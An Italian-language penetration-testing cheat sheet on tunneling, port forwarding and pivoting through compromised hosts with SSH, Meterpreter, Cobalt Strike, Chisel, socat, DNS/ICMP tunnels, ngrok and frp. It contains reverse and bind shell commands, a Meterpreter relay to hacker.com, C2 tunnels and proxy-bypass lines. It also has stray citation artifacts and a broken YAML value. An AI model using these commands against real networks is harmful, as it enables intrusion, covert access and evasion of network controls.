# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> **ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **TCP scans** (`-sT`) affinché questo funzioni.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Connessione grafica SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Apri una nuova porta nel server SSH --> Altra porta
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Porta locale --> Host compromesso (SSH) --> Terza_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Porta locale --> Host compromesso (SSH) --> Ovunque
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Questo è utile per ottenere reverse shell da host interni attraverso una DMZ al tuo host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Hai bisogno di **root in entrambi i dispositivi** (poiché stai per creare nuove interfacce) e la configurazione di sshd deve consentire il login come root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Abilita l'inoltro sul lato Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Imposta un nuovo percorso sul lato client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Sicurezza – Attacco Terrapin (CVE-2023-48795)**
> L'attacco di downgrade Terrapin del 2023 può consentire a un attaccante man-in-the-middle di manomettere l'inizializzazione SSH e iniettare dati in **qualsiasi canale inoltrato** ( `-L`, `-R`, `-D` ). Assicurati che sia il client che il server siano aggiornati (**OpenSSH ≥ 9.6/LibreSSH 6.7**) o disabilita esplicitamente gli algoritmi vulnerabili `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` in `sshd_config`/`ssh_config` prima di fare affidamento sui tunnel SSH. citeturn4search0

## SSHUTTLE

Puoi **tunneling** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
Ad esempio, inoltrando tutto il traffico che va a 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Connettersi con una chiave privata
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Porta locale --> Host compromesso (sessione attiva) --> Terza_cassa:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Un altro modo:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Apri una porta nel teamserver in ascolto su tutte le interfacce che possono essere utilizzate per **instradare il traffico attraverso il beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> In questo caso, la **porta è aperta nell'host beacon**, non nel Team Server e il traffico viene inviato al Team Server e da lì all'host:porta indicato.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Da notare:

- Il reverse port forward di Beacon è progettato per **tunnellare il traffico verso il Team Server, non per il relay tra macchine individuali**.
- Il traffico è **tunnellato all'interno del traffico C2 di Beacon**, inclusi i link P2P.
- **I privilegi di amministratore non sono richiesti** per creare reverse port forwards su porte alte.

### rPort2Port locale

> [!WARNING]
> In questo caso, la **porta è aperta nell'host beacon**, non nel Team Server e il **traffico è inviato al client Cobalt Strike** (non al Team Server) e da lì all'host:porta indicato.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Devi caricare un file web tunnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Puoi scaricarlo dalla pagina delle release di [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Devi usare la **stessa versione per client e server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Inoltro porte
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Usa la stessa versione per l'agente e il proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Binding e Ascolto dell'Agente
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Accedi alle porte locali dell'agente
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Tunnel inverso. Il tunnel viene avviato dalla vittima.\
Viene creato un proxy socks4 su 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivotare attraverso **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell di binding
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port tramite socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter tramite SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Puoi bypassare un **proxy non autenticato** eseguendo questa riga invece dell'ultima nella console della vittima:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
### SSL Socat Tunnel

**/bin/sh console**

Crea certificati su entrambi i lati: Client e Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Collegare la porta SSH locale (22) alla porta 443 dell'host attaccante
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

È come una versione console di PuTTY (le opzioni sono molto simili a quelle di un client ssh).

Poiché questo binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio ssh e la porta in modo da poter avere una connessione inversa. Quindi, per inoltrare solo una porta accessibile localmente a una porta nella nostra macchina:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Devi essere un amministratore locale (per qualsiasi porta)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

È necessario avere **accesso RDP al sistema**.\
Scarica:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza `Dynamic Virtual Channels` (`DVC`) dalla funzionalità Remote Desktop Service di Windows. DVC è responsabile per **il tunneling dei pacchetti sulla connessione RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Nel tuo computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **messaggio** che dice che il **plugin SocksOverRDP è abilitato**, e ascolterà su **127.0.0.1:1080**.

**Connettersi** tramite **RDP** e caricare ed eseguire nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Ora, conferma nella tua macchina (attaccante) che la porta 1080 è in ascolto:
```
netstat -antb | findstr 1080
```
Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per fare il proxy del traffico attraverso quella porta.**

## Proxifica le app GUI di Windows

Puoi fare in modo che le app GUI di Windows navigano attraverso un proxy usando [**Proxifier**](https://www.proxifier.com/).\
In **Profile -> Proxy Servers** aggiungi l'IP e la porta del server SOCKS.\
In **Profile -> Proxification Rules** aggiungi il nome del programma da proxificare e le connessioni agli IP che vuoi proxificare.

## Bypass del proxy NTLM

Lo strumento precedentemente menzionato: **Rpivot**\
**OpenVPN** può anche bypassarlo, impostando queste opzioni nel file di configurazione:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Autenticandosi contro un proxy, crea un binding di una porta localmente che è inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
Ad esempio, inoltra la porta 443.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Ora, se imposti ad esempio nel bersaglio il servizio **SSH** per ascoltare sulla porta 443. Puoi connetterti ad esso attraverso la porta 2222 dell'attaccante.\
Puoi anche utilizzare un **meterpreter** che si connette a localhost:443 e l'attaccante sta ascoltando sulla porta 2222.

## YARP

Un reverse proxy creato da Microsoft. Puoi trovarlo qui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e tunnelare i dati tra di essi utilizzando query DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Il tunnel sarà molto lento. Puoi creare una connessione SSH compressa attraverso questo tunnel utilizzando:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Scaricalo da qui**](https://github.com/iagox86/dnscat2)**.**

Stabilisce un canale C\&C tramite DNS. Non richiede privilegi di root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Puoi usare [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) per eseguire un client dnscat2 in powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding con dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Cambiare il DNS di proxychains

Proxychains intercetta la chiamata `gethostbyname` della libc e instrada la richiesta DNS tcp attraverso il proxy socks. Per **default** il server **DNS** che proxychains utilizza è **4.2.2.2** (hardcoded). Per cambiarlo, modifica il file: _/usr/lib/proxychains3/proxyresolv_ e cambia l'IP. Se sei in un **ambiente Windows** puoi impostare l'IP del **domain controller**.

## Tunnel in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## Tunneling ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e instradare i dati tra di essi utilizzando richieste di echo ICMP.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Scaricalo da qui**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **è uno strumento per esporre soluzioni a Internet con un'unica riga di comando.**\
_Le URI di esposizione sono simili a:_ **UID.ngrok.io**

### Installazione

- Crea un account: https://ngrok.com/signup
- Download del client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usi di base

**Documentazione:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_È anche possibile aggiungere autenticazione e TLS, se necessario._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Esporre file con HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Utile per XSS, SSRF, SSTI ..._\
Direttamente da stdout o nell'interfaccia HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml esempio di configurazione semplice

Apre 3 tunnel:

- 2 TCP
- 1 HTTP con esposizione di file statici da /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Il demone `cloudflared` di Cloudflare può creare tunnel in uscita che espongono **servizi TCP/UDP locali** senza richiedere regole del firewall in entrata, utilizzando l'edge di Cloudflare come punto di incontro. Questo è molto utile quando il firewall in uscita consente solo il traffico HTTPS ma le connessioni in entrata sono bloccate.

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Tunnel persistenti con DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Inizia il connettore:
```bash
cloudflared tunnel run mytunnel
```
Perché tutto il traffico esce dall'host **in uscita su 443**, i tunnel Cloudflared sono un modo semplice per bypassare le ACL in ingresso o i confini NAT. Tieni presente che il binario di solito viene eseguito con privilegi elevati – utilizza contenitori o il flag `--user` quando possibile. citeturn1search0

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) è un reverse-proxy in Go attivamente mantenuto che supporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partire da **v0.53.0 (Maggio 2024)** può fungere da **SSH Tunnel Gateway**, quindi un host di destinazione può avviare un tunnel inverso utilizzando solo il client OpenSSH di base – nessun binario extra richiesto.

### Tunnel TCP inverso classico
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Utilizzando il nuovo gateway SSH (senza binario frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Il comando sopra pubblica la porta della vittima **8080** come **attacker_ip:9000** senza implementare alcun strumento aggiuntivo – ideale per il pivoting living-off-the-land. citeturn2search1

## Altri strumenti da controllare

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

{{#include ../banners/hacktricks-training.md}}
